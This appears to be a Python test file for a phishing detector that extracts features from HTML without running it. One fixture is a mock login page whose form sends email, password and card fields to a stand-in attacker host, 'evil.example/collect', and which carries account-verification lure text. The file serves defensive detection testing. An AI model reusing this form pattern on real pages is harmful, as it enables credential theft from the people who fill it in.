from phishguard_content.analyzer import ContentLimits, analyze_html


def test_html_features_and_external_targets_are_extracted_without_execution() -> None:
    body = b"""
    <html><title>Secure login</title><body>
      <form action='https://evil.example/collect'><input type='email'><input type='password'></form>
      <input name='card_number'><script>alert('ignored')</script>
      <iframe src='https://cdn.example/frame'></iframe>
      <a href='/help'>help</a><a href='https://other.example/'>other</a>
      <p>Verify your account payment details</p>
    </body></html>
    """

    result = analyze_html(body, "https://target.example/login")

    assert result.status == "success"
    assert result.features["html_password_input_count"] == 1.0
    assert result.features["html_external_form_action_count"] == 1.0
    assert result.features["html_external_link_count"] == 1.0
    assert result.features["html_external_resource_count"] == 1.0
    assert result.features["html_script_count"] == 1.0
    assert result.features["html_login_term_count"] >= 2.0


def test_non_html_is_blocked_without_parsing() -> None:
    result = analyze_html(b"MZ\x90\x00", "https://target.example/", "application/octet-stream")

    assert result.status == "blocked"
    assert result.error_code == "non_html_content_type"
    assert result.features["content_non_html"] == 1.0


def test_body_and_tag_limits_are_explicit() -> None:
    result = analyze_html(
        b"<div>" * 20,
        "https://target.example/",
        limits=ContentLimits(max_bytes=90, max_tags=3),
    )

    assert result.status == "error"
    assert result.error_code == "html_parse_limit"
    assert result.truncated is True


def test_html_is_decoded_with_replacement_and_evidence_is_structured() -> None:
    result = analyze_html(b"<p>caf\xc3\xa9</p>", "https://target.example/")

    assert result.status == "success"
    assert result.evidence
    assert all(item.source == "html-dom" for item in result.evidence)
